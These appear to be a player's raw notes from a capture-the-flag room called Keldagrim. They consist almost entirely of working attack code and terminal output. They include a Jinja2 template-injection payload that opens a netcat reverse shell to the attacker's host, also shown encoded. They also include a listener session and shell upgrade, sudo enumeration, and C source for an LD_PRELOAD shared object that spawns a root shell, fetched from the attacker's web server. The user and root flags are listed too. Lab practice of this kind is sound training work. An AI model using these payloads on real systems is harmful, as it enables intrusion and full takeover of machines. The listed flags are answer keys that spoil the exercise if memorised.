
Current user - thm{d55ac4d0a728741d7b8c23b999e73cf3} 

another revshell :)

{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.19.103 4444 >/tmp/f').read()}}

JTdCJTdCY29uZmlnLl9fY2xhc3NfXy5fX2luaXRfXy5fX2dsb2JhbHNfXyU1QidvcyclNUQucG9wZW4oJ3JtJTIwL3RtcC9mO21rZmlmbyUyMC90bXAvZjtjYXQlMjAvdG1wL2YlN0NzaCUyMC1pJTIwMiUzRSYxJTdDbmMlMjAxMC44LjE5LjEwMyUyMDQ0NDQlMjAlM0UvdG1wL2YnKS5yZWFkKCklN0QlN0Q=

┌──(kali㉿kali)-[~/keldagrim]
└─$ nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.197.217.
Ncat: Connection from 10.10.197.217:54934.
sh: 0: can't access tty; job control turned off

persistence
┌──(kali㉿kali)-[~/keldagrim]
└─$ nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.197.217.
Ncat: Connection from 10.10.197.217:54934.
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash");'
jed@keldagrim:~$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                       
┌──(kali㉿kali)-[~/keldagrim]
└─$ stty raw -echo;fg;
[1]  + continued  nc -lvnp 4444
                               export TERM=xterm

priv esc

jed@keldagrim:~$ find / -perm /4000 2>/dev/null
/bin/su
/bin/ping
/bin/mount
/bin/umount
/bin/fusermount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/at
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/authbind/helper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

jed@keldagrim:~$ sudo -l
Matching Defaults entries for jed on keldagrim:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User jed may run the following commands on keldagrim:
    (ALL : ALL) NOPASSWD: /bin/ps

The env_keep+=LD_PRELOAD allows us to inject shared objects into processes before we run them. In case of /bin/ps which we are allowed to run as root, we can inject code that gets executed as root.

https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

┌──(kali㉿kali)-[~/keldagrim]
└─$ nano shell.c 
                                                                                       
┌──(kali㉿kali)-[~/keldagrim]
└─$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
                                                                                       
┌──(kali㉿kali)-[~/keldagrim]
└─$ ls     
shell.c  shell.py  shell.so
                                                                                       
┌──(kali㉿kali)-[~/keldagrim]
└─$ cat shell.c 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
}

transferring

jed@keldagrim:~$ wget http://10.8.19.103:8000/shell.so
--2022-11-23 01:13:52--  http://10.8.19.103:8000/shell.so
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14152 (14K) [application/octet-stream]
Saving to: ‘shell.so’

shell.so            100%[===================>]  13.82K  71.0KB/s    in 0.2s    

2022-11-23 01:13:53 (71.0 KB/s) - ‘shell.so’ saved [14152/14152]

┌──(kali㉿kali)-[~/keldagrim]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.197.217 - - [22/Nov/2022 19:30:57] "GET /shell.py HTTP/1.1" 200 -
10.10.197.217 - - [22/Nov/2022 19:38:08] "GET /shell.py HTTP/1.1" 200 -
10.10.197.217 - - [22/Nov/2022 19:40:37] "GET /shell.py HTTP/1.1" 200 -
10.10.197.217 - - [22/Nov/2022 19:47:21] "GET /shell.py HTTP/1.1" 200 -
10.10.197.217 - - [22/Nov/2022 19:50:47] "GET /shell.py HTTP/1.1" 200 -
10.10.197.217 - - [22/Nov/2022 20:13:53] "GET /shell.so HTTP/1.1" 200 -

jed@keldagrim:~$ mv shell.so /tmp
jed@keldagrim:~$ cd /tmp
jed@keldagrim:/tmp$ ls
f
shell.so
systemd-private-99f3478a2d79495ab810925c7be4c32b-systemd-resolved.service-WAg8jL
systemd-private-99f3478a2d79495ab810925c7be4c32b-systemd-timesyncd.service-Xu3h1y
jed@keldagrim:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /bin/ps

root@keldagrim:/tmp# cd /root
root@keldagrim:/root# ls
root.txt
root@keldagrim:/root# cat root.txt
thm{bf2a087f833b58df233c0f24eac3aec5}

😊 



```

![[Pasted image 20221026142628.png]]

![[Pasted image 20221026142821.png]]

![[Pasted image 20221026143259.png]]

![[Pasted image 20221026143358.png]]

![[Pasted image 20221122193156.png]]

user.txt
*thm{d55ac4d0a728741d7b8c23b999e73cf3}*


root.txt
*thm{bf2a087f833b58df233c0f24eac3aec5}*


[[Scripting]]
[[Ra]]